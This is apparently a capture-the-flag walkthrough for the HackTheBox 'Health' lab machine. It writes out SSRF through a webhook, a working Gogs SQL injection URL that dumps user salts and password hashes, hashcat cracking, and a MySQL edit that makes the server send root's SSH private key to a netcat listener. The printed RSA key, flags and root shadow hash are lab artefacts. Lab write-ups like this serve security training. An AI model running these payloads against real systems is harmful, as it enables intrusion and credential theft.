# Health: HackTheBox Medium Level
IP: 10.10.11.176

## Nmap
`nmap 10.10.11.176`

Output:
```
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

More specific result:
```
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 32:b7:f4:d4:2f:45:d3:30:ee:12:3b:03:67:bb:e6:31 (RSA)
|   256 86:e1:5d:8c:29:39:ac:d7:e8:15:e6:49:e2:35:ed:0c (ECDSA)
|_  256 ef:6b:ad:64:d5:e4:5b:3e:66:79:49:f4:ec:4c:23:9f (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HTTP Monitoring Tool
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
``` 

## Add the IP address in your /etc/hosts
```
10.10.11.176 health.htb
```

## Visit $IP:80 in web-browser
<img src="htb-health-1.png" alt="pic" >
We can see that there is simple webhook available. We can use it get information about port 3000.

## Exploit

We can host simple netcat server in our local machine making it listening in port 4444.
Then we will create simple python script `redirect.py`  which will curl the port 3000 of the target machine from which we will get a connection in netcat.
<img src="htb-health-2.png">

Run the python script as follow:
```
python3 redirect.py http://127.0.0.1:3000
```
Then listen in netcat,we get connection like below after testing in webpage.
<img src="htb-health-3.png">

From the response of netcat,we can copy the html context and remove some key like `\n`,`\t` and `\`.
Then we can run it locally. Then something like below can be observed.
<img src="htb-health-4.png">


<h1>Gogs 0.5.5.1010 Beta Found.</h1> 
We know Gogs is a self-hosted Git service.

### Exploit on Gogs
While searching for vulnerability in Gogs. We came across this [SQL Injection](https://www.exploit-db.com/exploits/35238).
Reading this vulnerability description, we can exploit using `/api/v1/repos/search?q=<search query>.` this request.

### Get Username:
Command:
```
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/salt/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
```

Using netcat to listen on port `3000`.We get:
<img src="htb-health-5.png">

We can see that the request include the username and other some important data. 
The output can be listed in more organized manner as below:
```
username: susanne
avatar: 1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce

username: sO3XIbeW14
avatar: 1.gravatar.com/avatar/1
```
Two user's data are obtained.

### Get Password:
Command:
```
python3 redirect.py "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--"
```

We get password. The output can be listed in more organized manner as below:
```
username: susanne
avatar: 1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce,
username:  66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37
avatar: 1.gravatar.com/avatar/1
```

### Create hash password
Command:
```
echo 'sha256:100000':$(echo 'sO3XIbeW14' | base64 | cut -c1-14)':'$(echo '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37' | xxd -r -p | base64) > hash.txt
```
The output will be stored in `hash.txt` file. We can see the result using `cat hash.txt` command.


## Cracking Password Hashcat
Command:
```
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt 
```

Once hashcat successfully cracked the password, we get password `february15`.

## Login Through SSH
Command:
```
ssh susanne@10.10.11.176  
```
When asked for password, enter `february15`.

We get shell access as user `susanne`. Then we can get our first flag.


## Pspy32
Import `pspy32` from local machine to target machine and check for running process.

We see 2 process which is interesting and run by root user. They are:
```
2022/09/01 14:21:01 CMD: UID=0    PID=3337   /bin/bash -c cd /var/www/html && php artisan schedule:run >> /dev/null 2>&1 
2022/09/01 14:19:06 CMD: UID=0    PID=3317   | mysql laravel --execute TRUNCATE tasks
```
  
We found `.env` file in `/var/www/html` which contains following value:
```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

We get the username, password and database name.

Also in file `/var/www/html/app/Http/Controllers/HealthChecker.php`, we found:
```
public static function check($webhookUrl, $monitoredUrl, $onlyError = false)
    {

        $json = [];
        $json['webhookUrl'] = $webhookUrl;
        $json['monitoredUrl'] = $monitoredUrl;

        $res = @file_get_contents($monitoredUrl, false);
        if ($res) {

            if ($onlyError) {
                return $json;
            }

            $json['health'] = "up";
            $json['body'] = $res;
            if (isset($http_response_header)) {
            $headers = [];
            $json['message'] = $http_response_header[0];

```

In above code, the `$monitoredUrl` is used to pass the file which can be controlled from mysql.

Let's Exploit.
- Step 1: Listen on port 80 in local machine using netcat. Command: `nc -lvnp 80`.
- Step 2: Create webhook to your local machine. 
  <img src="htb-health-6.png">
- Step 3: Login to mysql server. Command: `mysql -u laravel -pMYsql_strongestpass@2014+ -D laravel`.
- Step 4: Update `monitoredUrl` value `update tasks set monitoredUrl='file:///root/.ssh/id_rsa';`.
- Step 5: Wait for sometimes and keep checking netcat connection. We should get respose like below:
  <img src="htb-health-7.png">

  The above response contains private rsa id of root user. By removing line breaking, we get data:
  ```
  -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEAwddD+eMlmkBmuU77LB0LfuVNJMam9/jG5NPqc2TfW4Nlj9gE
    KScDJTrF0vXYnIy4yUwM4/2M31zkuVI007ukvWVRFhRYjwoEPJQUjY2s6B0ykCzq
    IMFxjreovi1DatoMASTI9Dlm85mdL+rBIjJwfp+Via7ZgoxGaFr0pr8xnNePuHH/
    KuigjMqEn0k6C3EoiBGmEerr1BNKDBHNvdL/XP1hN4B7egzjcV8Rphj6XRE3bhgH
    7so4Xp3Nbro7H7IwIkTvhgy61bSUIWrTdqKP3KPKxua+TqUqyWGNksmK7bYvzhh8
    W6KAhfnHTO+ppIVqzmam4qbsfisDjJgs6ZwHiQIDAQABAoIBAEQ8IOOwQCZikUae
    NPC8cLWExnkxrMkRvAIFTzy7v5yZToEqS5yo7QSIAedXP58sMkg6Czeeo55lNua9
    t3bpUP6S0c5x7xK7Ne6VOf7yZnF3BbuW8/v/3Jeesznu+RJ+G0ezyUGfi0wpQRoD
    C2WcV9lbF+rVsB+yfX5ytjiUiURqR8G8wRYI/GpGyaCnyHmb6gLQg6Kj+xnxw6Dl
    hnqFXpOWB771WnW9yH7/IU9Z41t5tMXtYwj0pscZ5+XzzhgXw1y1x/LUyan++D+8
    efiWCNS3yeM1ehMgGW9SFE+VMVDPM6CIJXNx1YPoQBRYYT0lwqOD1UkiFwDbOVB2
    1bLlZQECgYEA9iT13rdKQ/zMO6wuqWWB2GiQ47EqpvG8Ejm0qhcJivJbZCxV2kAj
    nVhtw6NRFZ1Gfu21kPTCUTK34iX/p/doSsAzWRJFqqwrf36LS56OaSoeYgSFhjn3
    sqW7LTBXGuy0vvyeiKVJsNVNhNOcTKM5LY5NJ2+mOaryB2Y3aUaSKdECgYEAyZou
    fEG0e7rm3z++bZE5YFaaaOdhSNXbwuZkP4DtQzm78Jq5ErBD+a1af2hpuCt7+d1q
    0ipOCXDSsEYL9Q2i1KqPxYopmJNvWxeaHPiuPvJA5Ea5wZV8WWhuspH3657nx8ZQ
    zkbVWX3JRDh4vdFOBGB/ImdyamXURQ72Xhr7ODkCgYAOYn6T83Y9nup4mkln0OzT
    rti41cO+WeY50nGCdzIxkpRQuF6UEKeELITNqB+2+agDBvVTcVph0Gr6pmnYcRcB
    N1ZI4E59+O3Z15VgZ/W+o51+8PC0tXKKWDEmJOsSQb8WYkEJj09NLEoJdyxtNiTD
    SsurgFTgjeLzF8ApQNyN4QKBgGBO854QlXP2WYyVGxekpNBNDv7GakctQwrcnU9o
    ++99iTbr8zXmVtLT6cOr0bVVsKgxCnLUGuuPplbnX5b1qLAHux8XXb+xzySpJcpp
    UnRnrnBfCSZdj0X3CcrsyI8bHoblSn0AgbN6z8dzYtrrPmYA4ztAR/xkIP/Mog1a
    vmChAoGBAKcW+e5kDO1OekLdfvqYM5sHcA2le5KKsDzzsmboGEA4ULKjwnOXqJEU
    6dDHn+VY+LXGCv24IgDN6S78PlcB5acrg6m7OwDyPvXqGrNjvTDEY94BeC/cQbPm
    QeA60hw935eFZvx1Fn+mTaFvYZFMRMpmERTWOBZ53GTHjSZQoS3G
    -----END RSA PRIVATE KEY-----
  ```
- Step 6: Save the private key in file named as `root_id_rsa`.


## Root Shell
- Step 1: Change file permission of `root_id_rsa` to 600. Command: `chmod 600 root_id_rsa`.
- Step 2: Get root shell. Command: `ssh root@10.10.11.176 -i root_id_rsa`.
- Step 3: Get Root flag.

## Flag
- User Flag: 2ee75a13b82e96b7e9fc22f98354bee7
- Root Flag: e00502242bd6aa62f8baf14f63c57ed1

## /etc/shadow
`root:$6$CGK4O3ut$hQTwfTrsIVAL2.wTf.mNzkpipITwSLVjqTw5bN2bnXXQi8QU4lnrlnrBMZ87bzMMQEyuxnlLJIMGhKIFjZBFn/:19130:0:99999:7:::`

<h1>Completed</h1>